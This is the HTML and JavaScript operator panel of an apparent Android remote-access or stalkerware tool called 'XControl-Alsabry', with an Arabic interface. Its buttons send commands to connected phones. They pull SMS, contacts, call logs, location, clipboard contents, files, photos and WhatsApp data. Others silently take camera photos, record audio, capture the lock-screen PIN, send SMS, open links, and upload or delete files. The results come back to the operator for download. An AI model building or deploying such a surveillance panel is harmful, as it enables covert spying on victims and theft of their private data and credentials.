<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>XControl-Alsabry — لوحة التحكم</title>
<style>
  * { box-sizing: border-box; }
  body { background: #0d1117; color: #e6edf3; font-family: Tahoma, Arial, sans-serif; margin: 0; padding: 14px; }
  h1 { font-size: 22px; margin: 4px 0 12px; text-align: center; color: #58a6ff; }
  .bar { display: flex; flex-wrap: wrap; gap: 8px; margin-bottom: 10px; align-items: center; }
  input, select { background: #161b22; color: #e6edf3; border: 1px solid #30363d; border-radius: 6px; padding: 8px; font-size: 14px; }
  input { flex: 1; min-width: 120px; }
  button { background: #238636; color: #fff; border: none; border-radius: 6px; padding: 9px 12px; font-size: 14px; cursor: pointer; }
  button:hover { filter: brightness(1.15); }
  button.red { background: #b62324; }
  button.blue { background: #1f6feb; }
  .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 8px; margin-bottom: 12px; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 10px 12px; margin-bottom: 8px; font-size: 13px; word-break: break-word; }
  .on { color: #3fb950; font-weight: bold; }
  .off { color: #f85149; font-weight: bold; }
  .wait { color: #d29922; }
  table { border-collapse: collapse; width: 100%; margin-top: 6px; font-size: 12px; }
  th, td { border: 1px solid #30363d; padding: 4px 6px; text-align: right; }
  th { background: #21262d; }
  td button { padding: 4px 8px; font-size: 13px; margin: 1px; }
  pre { white-space: pre-wrap; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 8px; margin: 6px 0 0; }
  img, video { max-width: 280px; border-radius: 6px; margin-top: 6px; }
  audio { margin-top: 6px; width: 100%; }
  a { color: #58a6ff; }
</style>
</head>
<body>

<h1>🎛 XControl-Alsabry — لوحة التحكم</h1>

<div class="bar">
  <select id="dev" style="flex:1">
    <option value="">— اختر الجهاز —</option>
  </select>
  <button class="blue" onclick="loadDevices()">🔄 تحديث الأجهزة</button>
  <button onclick="clearHistory()">🧹 مسح السجل</button>
  <button class="red" onclick="logout()">🚪 خروج</button>
</div>

<div class="grid">
  <button onclick="sendCmd('info',{})">ℹ️ معلومات الجهاز</button>
  <button onclick="sendCmd('sms',{})">📩 الرسائل SMS</button>
  <button onclick="sendCmd('contacts',{})">👥 جهات الاتصال</button>
  <button onclick="sendCmd('calls',{})">📞 سجل المكالمات</button>
  <button onclick="sendCmd('apps',{})">📱 التطبيقات</button>
  <button onclick="sendCmd('location',{})">📍 الموقع</button>
  <button onclick="sendCmd('clipboard',{})">📋 الحافظة</button>
  <button onclick="sendCmd('files',{path:'/storage/emulated/0'})">📁 الملفات</button>
  <button onclick="sendCmd('photos',{})">🖼 الصور</button>
  <button onclick="sendCmd('videos',{})">🎬 الفيديوهات</button>
  <button onclick="sendCmd('photo',{facing:'back'})">📷 التقاط صورة</button>
  <button onclick="sendCmd('audio',{seconds:10})">🎙 تسجيل 10 ث</button>
  <button onclick="sendCmd('whatsapp',{})">💬 ملفات واتساب</button>
  <button onclick="sendLock()">🔒 قفل الجهاز</button>
  <button onclick="sendCmd('capture_pin',{})">📵 التقاط رمز القفل</button>
  <button onclick="sendSms()">✉️ إرسال SMS</button>
  <button onclick="sendUrl()">🌐 فتح رابط</button>
</div>

<div class="bar">
  <input id="path" placeholder="مسار ملف (مثال: /storage/emulated/0/Download/ملف.pdf)">
  <button class="blue" onclick="sendCmd('get_file',{path:pathVal()})">⬇️ تنزيل من الجهاز</button>
  <button class="red" onclick="sendCmd('delete_file',{path:pathVal()})">🗑 حذف</button>
</div>

<div class="bar">
  <input type="file" id="uf">
  <button onclick="pickUpload()">⬆️ رفع إلى الجهاز</button>
</div>

<div id="out"></div>

<script>
const seen = {};
let rowActs = [];

function esc(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, c =>
    ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function fmt(n) {
  n = Number(n) || 0;
  if (n >= 1048576) return (n / 1048576).toFixed(1) + ' MB';
  if (n >= 1024) return (n / 1024).toFixed(1) + ' KB';
  return n + ' B';
}
function log(msg) {
  const d = document.createElement('div');
  d.className = 'card wait';
  d.textContent = msg;
  document.getElementById('out').insertAdjacentElement('afterbegin', d);
}
function pathVal() { return document.getElementById('path').value.trim(); }

async function api(path, body) {
  const r = await fetch(path, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body || {})
  });
  if (r.status === 401 || r.status === 403) { location.href = '/'; throw new Error('انتهت الجلسة'); }
  let j = {};
  try { j = await r.json(); } catch (e) {}
  if (!r.ok) throw new Error(j.error || ('HTTP ' + r.status));
  return j;
}

async function loadDevices() {
  const sel = document.getElementById('dev');
  const prev = sel.value;
  sel.innerHTML = '<option value="">— اختر الجهاز —</option>';
  try {
    const r = await fetch('/api/devices');
    const list = await r.json();
    if (!Array.isArray(list) || list.length === 0) {
      log('⚠ لا توجد أجهزة متصلة — تأكد أن التطبيق مفتوح على الهاتف');
      return;
    }
    for (const d of list) {
      const opt = document.createElement('option');
      opt.value = d.id;
      opt.textContent = (d.name || 'جهاز') + ' — ' + (d.model || '');
      sel.appendChild(opt);
    }
    if (prev && list.some(d => d.id === prev)) sel.value = prev;
    log('✅ ' + list.length + ' جهاز متصل');
  } catch (e) {
    log('❌ فشل جلب الأجهزة: ' + e.message);
  }
}

async function sendCmd(cmd, args) {
  const sel = document.getElementById('dev');
  if (!sel || !sel.value) { log('⚠ اختر جهازًا أولاً من القائمة'); return; }
  log('⏳ إرسال أمر: ' + cmd + ' ...');
  try {
    const j = await api('/api/exec', { id: sel.value, cmd, args: args || {} });
    log('✅ أُرسل ' + cmd + ' — cmdId: ' + String(j.cmdId || '').slice(0, 8));
  } catch (e) {
    log('❌ فشل الإرسال: ' + e.message);
  }
}

function sendLock() {
  const sel = document.getElementById('dev');
  if (!sel || !sel.value) { log('⚠ اختر جهازًا أولاً'); return; }
  if (!confirm('تأكيد قفل الجهاز؟')) return;
  sendCmd('lock', {});
}

function sendSms() {
  const n = prompt('رقم الهاتف:');
  if (!n) return;
  const t = prompt('نص الرسالة:');
  if (!t) return;
  sendCmd('send_sms', { number: n, text: t });
}

function sendUrl() {
  const u = prompt('الرابط:');
  if (!u) return;
  sendCmd('open_url', { url: u });
}

function pickUpload() {
  const f = document.getElementById('uf').files[0];
  if (!f) { log('⚠ اختر ملفًا أولاً'); return; }
  if (f.size > 40 * 1024 * 1024) { log('⚠ الملف أكبر من 40MB — حد السيرفر 60MB للطلب'); return; }
  const rd = new FileReader();
  rd.onload = () => {
    const b64 = String(rd.result).split(',')[1];
    log('⏳ رفع ' + f.name + ' (' + fmt(f.size) + ') ...');
    sendCmd('upload_file', { fname: f.name, path: '', data: b64 });
  };
  rd.onerror = () => log('❌ فشل قراءة الملف');
  rd.readAsDataURL(f);
}

function rowAct(i, act) {
  const o = rowActs[i];
  if (!o) return;
  if (o.type === 'media') {
    if (act === 'd') sendCmd('download_media', { kind: o.kind, id: o.id, fname: o.fname });
    else sendCmd('delete_media', { kind: o.kind, id: o.id });
  } else {
    if (act === 'd') sendCmd('get_file', { path: o.path });
    else sendCmd('delete_file', { path: o.path });
  }
}

function render(h) {
  let html = '<div class="card"><b>' + esc((h.cmdId || '').slice(0, 8)) + '</b> — ' +
    (h.ok ? '<span class="on">نجح</span>' : '<span class="off">فشل</span>') +
    (h.fname ? ' · ' + esc(h.fname) : '') +
    (h.size ? ' · ' + fmt(h.size) : '');

  // ① نتيجة ملف (صورة/صوت/فيديو/أي ملف): رابط تنزيل + معاينة — تعمل حتى للملفات الصغيرة
  if (h.fname) {
    const url = '/api/file/' + encodeURIComponent(h.cmdId);
    const ext = (h.fname || '').split('.').pop().toLowerCase();
    html += '<br><a href="' + url + '" download>⬇️ تنزيل الملف</a>';
    if (['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(ext))
      html += '<br><img src="' + url + '" alt="صورة">';
    else if (['m4a', 'mp3', 'aac', 'wav', 'ogg', 'amr'].includes(ext))
      html += '<br><audio controls src="' + url + '"></audio>';
    else if (['mp4', '3gp', 'webm', 'mkv'].includes(ext))
      html += '<br><video controls src="' + url + '"></video>';
  } else if (h.data) {
    try {
      const d = JSON.parse(h.data);

      // ② مستكشف الملفات: مجلدات وملفات مع أزرار فتح/تنزيل/حذف
      if (d && Array.isArray(d.items)) {
        const cur = esc(d.path || '');
        const par = esc(d.parent || '');
        html += '<br><b>📁 المسار الحالي:</b> ' + cur;
        html += '<br><button onclick="sendCmd(\'files\',{path:\'' + cur + '\'})">🔄 تحديث</button>';
        if (par) html += ' <button class="blue" onclick="sendCmd(\'files\',{path:\'' + par + '\'})">⬆️ المجلد الأب</button>';
        html += '<table><tr><th>الاسم</th><th>الحجم</th><th>التاريخ</th><th>إجراءات</th></tr>';
        (d.items || []).forEach(o => {
          const p = esc(o.path || '');
          html += '<tr><td>' + (o.dir ? '📁 ' : '📄 ') + esc(o.name) + '</td><td>' + (o.dir ? '—' : fmt(o.size)) + '</td><td>' + new Date(o.time || 0).toLocaleString('ar') + '</td><td>';
          if (o.dir) {
            html += '<button onclick="sendCmd(\'files\',{path:\'' + p + '\'})">📂 فتح</button>';
          } else {
            html += '<button onclick="sendCmd(\'get_file\',{path:\'' + p + '\'})">⬇️</button> ';
            html += '<button class="red" onclick="sendCmd(\'delete_file\',{path:\'' + p + '\'})">🗑</button>';
          }
          html += '</td></tr>';
        });
        html += '</table>';

      // ③ جدول بيانات (جهات اتصال، SMS، صور، فيديوهات...) مع أزرار
      } else if (Array.isArray(d) && d.length && typeof d[0] === 'object') {
        rowActs = [];
        html += '<table><tr><th>#</th>' + Object.keys(d[0]).map(k => '<th>' + esc(k) + '</th>').join('') + '<th>إجراءات</th></tr>';
        d.slice(0, 500).forEach((o, i) => {
          html += '<tr><td>' + (i + 1) + '</td>';
          Object.values(o).forEach(v => html += '<td>' + esc(v) + '</td>');
          let btns = '';
          if (o.kind && o.id) {
            const idx = rowActs.length;
            rowActs.push({ type: 'media', kind: o.kind, id: o.id, fname: o.name || o.id });
            btns += '<button onclick="rowAct(' + idx + ',\'d\')">⬇️</button> ';
            btns += '<button class="red" onclick="rowAct(' + idx + ',\'x\')">🗑</button>';
          } else if (o.path) {
            const idx = rowActs.length;
            rowActs.push({ type: 'file', path: o.path });
            btns += '<button onclick="rowAct(' + idx + ',\'d\')">⬇️</button> ';
            btns += '<button class="red" onclick="rowAct(' + idx + ',\'x\')">🗑</button>';
          }
          html += '<td>' + btns + '</td></tr>';
        });
        html += '</table>';

      // ④ كائن بسيط: جدول مفتاح/قيمة
      } else if (typeof d === 'object' && d !== null) {
        html += '<table>' + Object.entries(d).map(([k, v]) =>
          '<tr><td><b>' + esc(k) + '</b></td><td>' + esc(typeof v === 'object' ? JSON.stringify(v) : v) + '</td></tr>'
        ).join('') + '</table>';
      } else {
        html += '<pre>' + esc(d) + '</pre>';
      }
    } catch (e) {
      html += '<pre>' + esc(h.data) + '</pre>';
    }
  }
  html += '</div>';
  document.getElementById('out').insertAdjacentHTML('afterbegin', html);
}

async function pollResults() {
  const sel = document.getElementById('dev');
  if (!sel || !sel.value) return;
  try {
    const j = await api('/api/results', { id: sel.value });
    if (Array.isArray(j)) {
      for (const r of j) {
        if (!seen[r.cmdId]) {
          seen[r.cmdId] = true;
          render(r);
        }
      }
    }
  } catch (e) { /* تجاهل */ }
}

async function clearHistory() {
  if (!confirm('مسح كل سجل العمليات؟')) return;
  try { await api('/api/clear', {}); log('🧹 تم مسح السجل'); } catch (e) { log('❌ ' + e.message); }
}

function logout() {
  fetch('/api/logout', { method: 'POST' }).catch(() => {});
  location.href = '/';
}

loadDevices();
setInterval(loadDevices, 30000);
setInterval(pollResults, 3000);
</script>
</body>
</html>
